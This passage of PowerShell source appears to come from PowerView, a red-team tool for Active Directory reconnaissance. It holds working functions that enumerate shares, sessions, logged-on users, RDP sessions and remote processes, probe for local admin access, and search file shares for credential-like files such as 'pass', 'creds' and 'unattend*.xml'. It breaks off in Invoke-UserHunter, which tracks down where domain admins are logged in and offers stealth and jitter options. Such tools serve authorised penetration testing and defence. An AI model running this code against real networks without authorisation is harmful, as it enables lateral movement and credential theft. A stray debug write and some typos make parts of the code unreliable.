                                    try {
                                        $MemberName = Convert-SidToName $_.cn
                                    }
                                    catch {
                                        # if there's a problem contacting the domain to resolve the SID
                                        $MemberName = $_.cn
                                    }
                                }

                                $Member | Add-Member Noteproperty 'AccountName' "$MemberDomain/$MemberName"
                                $Member | Add-Member Noteproperty 'SID' $_.objectsid
                                $Member | Add-Member Noteproperty 'Disabled' $False
                                $Member | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                                $Member | Add-Member Noteproperty 'IsDomain' $True
                                $Member | Add-Member Noteproperty 'LastLogin' ''
                                $Member
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Get-NetShare {
<#
    .SYNOPSIS

        Gets share information for a specified server.

    .DESCRIPTION

        This function will execute the NetShareEnum Win32API call to query
        a given host for open shares. This is a replacement for
        "net share \\hostname"

    .PARAMETER HostName

        The hostname to query for shares. Also accepts IP addresses.

    .OUTPUTS

        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
        result structure which includes the name and note for each share.

    .EXAMPLE

        PS C:\> Get-NetShare

        Returns active shares on the local host.

    .EXAMPLE

        PS C:\> Get-NetShare -HostName sqlserver

        Returns active shares on the 'sqlserver' host
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $HostName = Get-NameField $HostName

        # arguments for NetShareEnum
        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get the share information
        $Result = $Netapi32::NetShareEnum($HostName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $Offset = $PtrInfo.ToInt64()

        Write-Debug "Get-NetShare result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($Offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $SHARE_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                # create a new int ptr at the given offset and cast
                #   the pointer as our result structure
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SHARE_INFO_1
                # return all the sections of the structure
                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment
            }

            # free up the result buffer
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetLoggedon {
<#
    .SYNOPSIS

        Gets users actively logged onto a specified server.

    .DESCRIPTION

        This function will execute the NetWkstaUserEnum Win32API call to query
        a given host for actively logged on users.

    .PARAMETER HostName

        The hostname to query for logged on users.

    .OUTPUTS

        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
        result structure which includes the username and domain of logged on users.

    .EXAMPLE

        PS C:\> Get-NetLoggedon

        Returns users actively logged onto the local host.

    .EXAMPLE

        PS C:\> Get-NetLoggedon -HostName sqlserver

        Returns users actively logged onto the 'sqlserver' host.

    .LINK

        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $HostName = Get-NameField $HostName

        # Declare the reference variables
        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get logged on user information
        $Result = $Netapi32::NetWkstaUserEnum($HostName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $Offset = $PtrInfo.ToInt64()

        Write-Debug "Get-NetLoggedon result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($Offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $WKSTA_USER_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                # create a new int ptr at the given offset and cast
                #   the pointer as our result structure
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                # return all the sections of the structure
                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $increment

            }

            # free up the result buffer
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetSession {
<#
    .SYNOPSIS

        Gets active sessions for a specified server.
        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

    .DESCRIPTION

        This function will execute the NetSessionEnum Win32API call to query
        a given host for active sessions on the host.

    .PARAMETER HostName

        The hostname to query for active sessions.

    .PARAMETER UserName

        The user name to filter for active sessions.

    .OUTPUTS

        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
        result structure which includes the host and username associated
        with active sessions.

    .EXAMPLE

        PS C:\> Get-NetSession

        Returns active sessions on the local host.

    .EXAMPLE

        PS C:\> Get-NetSession -HostName sqlserver

        Returns active sessions on the 'sqlserver' host.

    .LINK

        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost',

        [String]
        $UserName = ''
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $HostName = Get-NameField $HostName

        # arguments for NetSessionEnum
        $QueryLevel = 10
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get session information
        $Result = $Netapi32::NetSessionEnum($HostName, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $Offset = $PtrInfo.ToInt64()

        Write-Debug "Get-NetSession result: $Result"
        Add-Content C:\Temp\out.txt "Netapi32::NetSessionEnum: $($Netapi32::NetSessionEnum)"

        # 0 = success
        if (($Result -eq 0) -and ($Offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $SESSION_INFO_10::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SESSION_INFO_10

                # return all the sections of the structure
                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $increment

            }
            # free up the result buffer
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetRDPSession {
<#
    .SYNOPSIS

        Gets active RDP sessions for a specified server.
        This is a replacement for qwinsta.

    .DESCRIPTION

        This function will execute the WTSEnumerateSessionsEx and 
        WTSQuerySessionInformation Win32API calls to query a given
        RDP remote service for active sessions and originating IPs.

        Note: only members of the Administrators or Account Operators local group
        can successfully execute this functionality on a remote target.

    .PARAMETER HostName

        The hostname to query for active RDP sessions.

    .OUTPUTS

        A custom psobject with the HostName, SessionName, UserName, ID, connection state,
        and source IP of the connection.

    .EXAMPLE

        PS C:\> Get-NetRDPSession

        Returns active RDP/terminal sessions on the local host.

    .EXAMPLE

        PS C:\> Get-NetRDPSession -HostName "sqlserver"

        Returns active RDP/terminal sessions on the 'sqlserver' host.
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $HostName = Get-NameField $HostName

        # open up a handle to the Remote Desktop Session host
        $Handle = $Wtsapi32::WTSOpenServerEx($HostName)

        # if we get a non-zero handle back, everything was successful
        if ($Handle -ne 0) {

            Write-Debug "WTSOpenServerEx handle: $Handle"

            # arguments for WTSEnumerateSessionsEx
            $ppSessionInfo = [IntPtr]::Zero
            $pCount = 0
            
            # get information on all current sessions
            $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)

            # Locate the offset of the initial intPtr
            $Offset = $ppSessionInfo.ToInt64()

            Write-Debug "WTSEnumerateSessionsEx result: $Result"
            Write-Debug "pCount: $pCount"

            if (($Result -ne 0) -and ($Offset -gt 0)) {

                # Work out how mutch to increment the pointer by finding out the size of the structure
                $Increment = $WTS_SESSION_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $pCount); $i++) {
     
                    # create a new int ptr at the given offset and cast
                    #   the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                    $RDPSession = New-Object PSObject

                    if ($Info.pHostName) {
                        $RDPSession | Add-Member Noteproperty 'HostName' $Info.pHostName
                    }
                    else {
                        # if no hostname returned, use the specified hostname
                        $RDPSession | Add-Member Noteproperty 'HostName' $HostName
                    }

                    $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                        # if a domain isn't returned just use the username
                        $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                    }
                    else {
                        $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                    }

                    $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                    $RDPSession | Add-Member Noteproperty 'State' $Info.State

                    $ppBuffer = [IntPtr]::Zero
                    $pBytesReturned = 0

                    # query for the source client IP with WTSQuerySessionInformation
                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned)

                    $Offset2 = $ppBuffer.ToInt64()
                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $offset2
                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                    $SourceIP = $Info2.Address       
                    if($SourceIP[2] -ne 0) {
                        $SourceIP = [String]$SourceIP[2]+"."+[String]$SourceIP[3]+"."+[String]$SourceIP[4]+"."+[String]$SourceIP[5]
                    }
                    else {
                        $SourceIP = $Null
                    }

                    $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                    $RDPSession

                    # free up the memory buffer
                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                    $Offset += $increment
                }
                # free up the memory result buffer
                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
            }
            # Close off the service handle
            $Null = $Wtsapi32::WTSCloseServer($Handle)
        }
        else {
            # otherwise it failed - get the last error
            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            $Err = $Kernel32::GetLastError()
            Write-Verbuse "LastError: $Err"
        }
    }
}


function Invoke-CheckLocalAdminAccess {
<#
    .SYNOPSIS

        Checks if the current user context has local administrator access
        to a specified host or IP.

    .DESCRIPTION

        This function will use the OpenSCManagerW Win32API call to to establish
        a handle to the remote host. If this succeeds, the current user context
        has local administrator acess to the target.

        Idea stolen from the local_admin_search_enum post module in Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

    .PARAMETER HostName

        The hostname to query for active sessions.

    .OUTPUTS

        $True if the current user has local admin access to the hostname, $False otherwise

    .EXAMPLE

        PS C:\> Invoke-CheckLocalAdminAccess -HostName sqlserver

        Returns active sessions on the local host.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $HostName = Get-NameField $HostName

        # 0xF003F - SC_MANAGER_ALL_ACCESS
        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
        $Handle = $Advapi32::OpenSCManagerW("\\$HostName", 'ServicesActive', 0xF003F)

        Write-Debug "Invoke-CheckLocalAdminAccess handle: $Handle"

        # if we get a non-zero handle back, everything was successful
        if ($Handle -ne 0) {
            # Close off the service handle
            $Null = $Advapi32::CloseServiceHandle($Handle)
            $True
        }
        else {
            # otherwise it failed - get the last error
            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            $Err = $Kernel32::GetLastError()
            Write-Debug "Invoke-CheckLocalAdminAccess LastError: $Err"
            $False
        }
    }
}


function Get-LastLoggedOn {
<#
    .SYNOPSIS

        Gets the last user logged onto a target machine.

    .DESCRIPTION

        This function uses remote registry functionality to return
        the last user logged onto a target machine.

        Note: This function requires administrative rights on the
        machine you're enumerating.

    .PARAMETER HostName

        The hostname to query for open files. Defaults to the
        local host name.

    .OUTPUTS

        The last loggedon user name, or $Null if the enumeration fails.

    .EXAMPLE

        PS C:\> Get-LastLoggedOn

        Returns the last user logged onto the local machine.

    .EXAMPLE
        
        PS C:\> Get-LastLoggedOn -HostName WINDOWS1

        Returns the last user logged onto WINDOWS1
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $HostName = "."
    )

    process {

        # process multiple host object types from the pipeline
        $HostName = Get-NameField $HostName

        # try to open up the remote registry key to grab the last logged on user
        try {
            $Reg = [WMIClass]"\\$HostName\root\default:stdRegProv"
            $HKLM = 2147483650
            $Key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
            $Value = "LastLoggedOnUser"
            $Reg.GetStringValue($HKLM, $Key, $Value).sValue
        }
        catch {
            Write-Warning "[!] Error opening remote registry on $HostName. Remote registry likely not enabled."
            $Null
        }
    }
}


function Get-NetProcess {
<#
    .SYNOPSIS

        Gets a list of processes/owners on a remote machine.

    .PARAMETER HostName

        The hostname to query for open files. Defaults to the
        local host name.

    .PARAMETER RemoteUserName

        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

    .PARAMETER RemotePassword

        The password to use for the WMI call on a remote system.

    .OUTPUTS

        The last loggedon user name, or $Null if the enumeration fails.

    .EXAMPLE

        PS C:\> Get-LastLoggedOn

        Returns the last user logged onto the local machine.

    .EXAMPLE

        PS C:\> Get-LastLoggedOn -HostName WINDOWS1
    
        Returns the last user logged onto WINDOWS1
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    process {
        
        if($HostName) {
            # process multiple host object types from the pipeline
            $HostName = Get-NameField $HostName            
        }
        else {
            # default to the local hostname
            $HostName = [System.Net.Dns]::GetHostName()
        }

        $Credential = $Null

        if($RemoteUserName) {
            if($RemotePassword) {
                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)

                # try to enumerate the processes on the remote machine using the supplied credential
                try {
                    Get-WMIobject -Class Win32_process -ComputerName $HostName -Credential $Credential | ForEach-Object {
                        $Owner = $_.getowner();
                        $Process = New-Object PSObject
                        $Process | Add-Member Noteproperty 'Host' $HostName
                        $Process | Add-Member Noteproperty 'Process' $_.ProcessName
                        $Process | Add-Member Noteproperty 'PID' $_.ProcessID
                        $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                        $Process | Add-Member Noteproperty 'User' $Owner.User
                        $Process
                    }
                }
                catch {
                    Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
                }
            }
            else {
                Write-Warning "[!] RemotePassword must also be supplied!"
            }
        }
        else {
            # try to enumerate the processes on the remote machine
            try {
                Get-WMIobject -Class Win32_process -ComputerName $HostName | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'Host' $HostName
                    $Process | Add-Member Noteproperty 'Process' $_.ProcessName
                    $Process | Add-Member Noteproperty 'PID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $owner.Domain
                    $Process | Add-Member Noteproperty 'User' $owner.User
                    $Process
                }
            }
            catch {
                Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
            }
        }
    }
}


function Invoke-FileSearch {
<#
    .SYNOPSIS

        Searches a given server/path for files with specific terms in the name.

    .DESCRIPTION

        This function recursively searches a given UNC path for files with
        specific keywords in the name (default of pass, sensitive, secret, admin,
        login and unattend*.xml). The output can be piped out to a csv with the
        -OutFile flag. By default, hidden files/folders are included in search results.

    .PARAMETER Path

        UNC/local path to recursively search.

    .PARAMETER Terms

        Terms to search for.

    .PARAMETER OfficeDocs

        Search for office documents (*.doc*, *.xls*, *.ppt*)

    .PARAMETER FreshEXEs

        Find .EXEs accessed within the last week.

    .PARAMETER AccessDateLimit

        Only return files with a LastAccessTime greater than this date value.

    .PARAMETER WriteDateLimit

        Only return files with a LastWriteTime greater than this date value.

    .PARAMETER CreateDateLimit

        Only return files with a CreationDate greater than this date value.

    .PARAMETER ExcludeFolders

        Exclude folders from the search results.

    .PARAMETER ExcludeHidden

        Exclude hidden files and folders from the search results.

    .PARAMETER CheckWriteAccess

        Only returns files the current user has write access to.

    .PARAMETER OutFile

        Output results to a specified csv output file.

    .OUTPUTS

        The full path, owner, lastaccess time, lastwrite time, and size for each found file.

    .EXAMPLE

        PS C:\> Invoke-FileSearch -Path \\WINDOWS7\Users\
        
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'pass',
        'sensitive', or 'secret' in the title.

    .EXAMPLE

        PS C:\> Invoke-FileSearch -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
        
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
        or 'email' in the title, and writes the results out to a csv file
        named 'out.csv'

    .EXAMPLE

        PS C:\> Invoke-FileSearch -Path \\WINDOWS7\Users\ -AccessDateLimit 6/1/2014

        Returns all files accessed since 6/1/2014.

    .LINK
        
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',

        [String[]]
        $Terms,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String]
        $AccessDateLimit = '1/1/1970',

        [String]
        $WriteDateLimit = '1/1/1970',

        [String]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile
    )

    begin {
        # default search terms
        $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        # check if custom search terms were passed
        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $SearchTerms = $Terms
        }

        # append wildcards to the front and back of all search terms
        for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
            $SearchTerms[$i] = "*$($SearchTerms[$i])*"
        }

        # search just for office documents if specified
        if ($OfficeDocs) {
            $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }

        # find .exe's accessed within the last 7 days
        if($FreshEXEs) {
            # get an access time limit of 7 days ago
            $AccessDateLimit = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearchTerms = '*.exe'
        }
    }

    process {

        Write-Verbose "[*] Search path $Path"

        function Invoke-CheckWrite {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]param([String]$Path)
            try {
                $Filetest = [IO.FILE]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }

        # build our giant recursive search command w/ conditional options
        #   yes, I know this is terrible, but I'm lazy and it makes it easy to handle all the 
        #   flags and options :)
        $Cmd = "get-childitem $Path -rec $(if(-not $ExcludeHidden) {`"-Force`"}) -ErrorAction SilentlyContinue -include $($SearchTerms -join `",`") | where{ $(if($ExcludeFolders) {`"(-not `$_.PSIsContainer) -and`"}) (`$_.LastAccessTime -gt `"$AccessDateLimit`") -and (`$_.LastWriteTime -gt `"$WriteDateLimit`") -and (`$_.CreationTime -gt `"$CreateDateLimit`")} | select-object FullName,@{Name='Owner';Expression={(Get-Acl `$_.FullName).Owner}},LastAccessTime,LastWriteTime,Length $(if($CheckWriteAccess) {`"| Where-Object { `$_.FullName } | Where-Object { Invoke-CheckWrite -Path `$_.FullName }`"}) $(if($OutFile) {`"| Export-PowerViewCSV -OutFile $OutFile`"})"

        Invoke-Expression $Cmd
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function Invoke-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory)]
        [String[]]
        $Hosts,

        [Parameter(Position=1,Mandatory)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        Write-Verbose "[*] Total number of hosts: $HostCount"

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # import the current session state's variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if(!$NoImports) {

            # grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach($Var in $MyVars) {
                If($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # Add Functions from current runspace to the InitialSessionState
            ForEach($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $Jobs = @()
        $PS = @()
        $Wait = @()

        $Counter = 0
    }

    process {

        ForEach ($Server in $Hosts) {

            # make sure we get a server name
            if ($Server -ne '') {
                Write-Verbose "[*] Enumerating server $Server ($($Counter+1) of $($Hosts.count))"

                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }

                # create a "powershell pipeline runner"
                $PS += [powershell]::create()

                $PS[$Counter].runspacepool = $Pool

                # add the script block + arguments
                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('Server', $Server)
                if($ScriptParameters) {
                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
                    }
                }

                # start job
                $Jobs += $PS[$Counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $Wait += $Jobs[$Counter].AsyncWaitHandle
            }
            $Counter = $Counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $WaitTimeout = Get-Date

        # set a 60 second timeout for the scanning threads
        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }

        # end async call
        for ($y = 0; $y -lt $Counter; $y++) {

            try {
                # complete async job
                $PS[$y].EndInvoke($Jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $PS[$y].Dispose()
            }
        }
        
        $Pool.Dispose()
        Write-Verbose "All threads completed!"
    }
}


function Invoke-UserHunter {
<#
    .SYNOPSIS

        Finds which machines users of a specified group are logged into.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroupMember or reads in a target user list, queries the domain for all
        active machines with Get-NetComputer or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of
        active users with Get-NetSession/Get-NetLoggedon. The found user list is compared
        against the target list, and a status message is displayed for any hits.
        The flag -CheckAccess will check each positive host to see if the current
        user has local admin access to the machine.

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER GroupName

        Group name to query for target users.

    .PARAMETER TargetServer

        Hunt for users who are effective local admins on a target server.

    .PARAMETER UserName

        Specific username to search for.

    .PARAMETER UserFilter

        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"

    .PARAMETER UserADSpath

        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER UserList

        List of usernames to search for.

    .PARAMETER StopOnSuccess

        Stop hunting after finding after finding a target user.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER CheckAccess

        Check if the current user has local admin access to found machines.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain for query for machines, defaults to the current domain.

    .PARAMETER ShowAll

        Return all user location results, i.e. Invoke-UserView functionality.

    .PARAMETER SearchForest

        Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Stealth

        Only enumerate sessions from connonly used target servers.

    .PARAMETER StealthSource

        The source of target servers to use, 'DFS' (distributed file servers),
        'DC' (domain controllers), 'File' (file servers), or 'All'

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -CheckAccess

        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -Domain 'testing'

        Finds machines on the 'testing' domain where domain admins are logged into.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -Threads 20

        Multi-threaded user hunting, replaces Invoke-UserHunterThreaded.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -UserList users.txt -HostList hosts.txt

        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

    .EXAMPLE

